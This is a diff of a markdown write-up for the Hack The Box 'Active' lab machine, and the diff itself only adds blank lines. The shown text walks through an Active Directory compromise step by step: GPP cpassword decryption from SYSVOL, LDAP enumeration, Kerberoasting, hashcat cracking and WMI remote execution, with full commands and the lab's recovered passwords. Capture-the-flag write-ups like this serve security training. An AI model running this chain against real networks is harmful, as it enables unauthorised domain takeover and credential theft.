@@ -11,6 +11,7 @@ Group Policy Preferences (GPP) Credential Extraction
 Kerberoasting
 Hash Cracking
 Remote Code Execution via WMI
+
 🧠 Attack Path Summary
 Full port and service enumeration → Identify Domain Controller
 SMB enumeration → Anonymous access to SYSVOL
@@ -19,6 +20,7 @@ LDAP enumeration → Identify Kerberoastable users
 Kerberoasting → Extract service ticket hash
 Crack hash → Obtain Administrator credentials
 WMI execution → SYSTEM access → Root
+
 🔍 Enumeration
 🔹 Nmap Scan
 sudo nmap -Pn -p- -T4 -sS -sV -sC \
@@ -33,11 +35,14 @@ autorecon 10.129.18.70 \
 --dirbuster.tool feroxbuster \
 --dirbuster.threads 50 \
 -v
+
 🧩 Key Findings
 SMB (445) open
 LDAP (389) open
 Kerberos (88) open
+
 Host behaves like a Domain Controller
+
 📂 SMB Enumeration
 🔹 Anonymous Login
 smbclient -L //10.129.18.70 -N
@@ -55,6 +60,7 @@ Navigated to:
 /Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
 🔹 Extract cpassword
 gpp-decrypt "$(grep -oP 'cpassword="\K[^"]+' ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml)"
+
 🔑 Credentials Recovered
 SVC_TGS : GPPstillStandingStrong2k18
 🔹 Re-Enumerate SMB with Credentials
@@ -67,6 +73,7 @@ smbclient -L //10.129.18.70 -U SVC_TGS
 Located in:
 
 C:\Users\<user>\Desktop\user.txt
+
 🚀 Privilege Escalation
 🔹 LDAP Enumeration
 ldapsearch -x -H ldap://10.129.19.56 \
@@ -74,6 +81,7 @@ ldapsearch -x -H ldap://10.129.19.56 \
 -b "dc=active,dc=htb" \
 -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \
 samaccountname | grep sAMAccountName
+
 🧩 Findings
 Multiple users identified
 Administrator account active
@@ -88,6 +96,7 @@ GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' \
 
 🔹 Crack Hash
 hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
+
 🔑 Credentials Recovered
 Administrator : Ticketmaster1968
 🔹 Remote Code Execution (WMI)
@@ -97,6 +106,7 @@ wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.19.56
 
 🏁 Root Flag
 C:\Users\Administrator\Desktop\root.txt
+
 🧠 Key Takeaways
 GPP Credentials are still a real-world risk
 Misconfigured SYSVOL can expose plaintext creds
@@ -106,10 +116,12 @@ Kerberoasting remains highly effective
 Weak service account passwords = full domain compromise
 Attack Chain Matters
 Enumeration → Credential Access → Priv Esc → Execution
+
 🔁 Alternative Paths
 BloodHound enumeration (if creds obtained earlier)
 Crack other SPNs if multiple exist
 SMB relay (if signing disabled)
+
 🧰 Tools Used
 Nmap
 Autorecon
@@ -118,6 +130,7 @@ gpp-decrypt
 ldapsearch
 Impacket (GetUserSPNs.py, wmiexec.py)
 Hashcat
+
 📌 Final Thoughts
 
 This machine is a perfect example of:
